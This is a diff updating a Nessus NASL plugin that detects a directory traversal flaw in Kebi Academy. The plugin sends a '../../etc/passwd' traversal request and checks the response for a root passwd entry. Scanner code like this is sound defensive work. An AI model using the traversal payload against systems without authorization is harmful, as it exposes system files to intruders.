@@ -6,10 +6,10 @@
 if(description)
 {
  script_id(11453); 
- 
  script_bugtraq_id(7125);
  
- script_version("$Revision: 1.2 $");
+ 
+ script_version("$Revision: 1.7 $");
 
  name["english"] = "Kebi Academy Directory Traversal";
  script_name(english:name["english"]);
@@ -20,7 +20,7 @@ It enables a remote attacker to view any file on the computer
 with the privileges of the cgi/httpd user.
 
 Solution : Contact the vendor at http://solution.nara.co.kr/
-Risk factor : Serious";
+Risk factor : High";
 
  script_description(english:desc["english"]);
  
@@ -33,26 +33,29 @@ Risk factor : Serious";
  script_family(english:family["english"]);
  script_dependencie("find_service.nes", "http_version.nasl");
  script_require_ports("Services/www", 80);
+ script_exclude_keys("Settings/disable_cgi_scanning");
  exit(0);
 }
 
 include("http_func.inc");
 include("http_keepalive.inc");
 
-port = get_kb_item("Services/www");
-if(!port)port = 80;
+port = get_http_port(default:80);
+
 
 
 if(!get_port_state(port))exit(0);
 
 
-function check(req)
+function check(url)
 {
-  req = http_get(item:req, port:port);
+  local_var req, r;
+
+  req = http_get(item:url, port:port);
   r = http_keepalive_send_recv(port:port, data:req);
   if ( r == NULL ) exit(0);
   
-  if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
+  if(egrep(pattern:".*root:.*:0:[01]:", string:r))
   {
    	security_hole(port:port);
 	return(1);
@@ -74,5 +77,5 @@ foreach  d (dirs)
 foreach d (alldirs)
 {
  url = string(d, "/home?dir=/&file=../../../../../../../../../../../../etc/passwd&lang=kor");
- if(check(req:url))exit(0);
+ if(check(url:url))exit(0);
 }
